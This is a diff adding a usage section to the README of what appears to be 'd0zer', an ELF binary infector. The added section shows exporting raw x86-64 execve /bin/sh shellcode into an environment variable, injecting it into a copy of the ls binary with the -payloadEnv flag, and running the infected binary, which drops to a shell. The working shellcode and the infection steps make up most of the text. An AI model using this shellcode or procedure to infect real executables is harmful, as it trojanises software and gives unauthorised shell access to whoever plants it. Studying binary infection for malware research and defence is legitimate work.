@@ -85,3 +85,13 @@ Inceasing pHeader @ index 10 by 0x1000
 [+] writing payload into the binary
 [sad0p@Arch-Deliberate d0zer]$ 
 </pre>
+
+A custom payload can be injected into the binary with the `-payloadEnv` flag. Below I inject a basic execve /bin/sh into the ls
+command as an example.
+
+<pre>
+[sad0p@Arch-Deliberate d0zer]$ export DOZEREGG="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
+[sad0p@Arch-Deliberate d0zer]$ ./d0zer -target experimental/ls -payloadEnv DOZEREGG
+[sad0p@Arch-Deliberate d0zer]$ experimental/ls-infected
+sh-5.1$ 
+</pre>
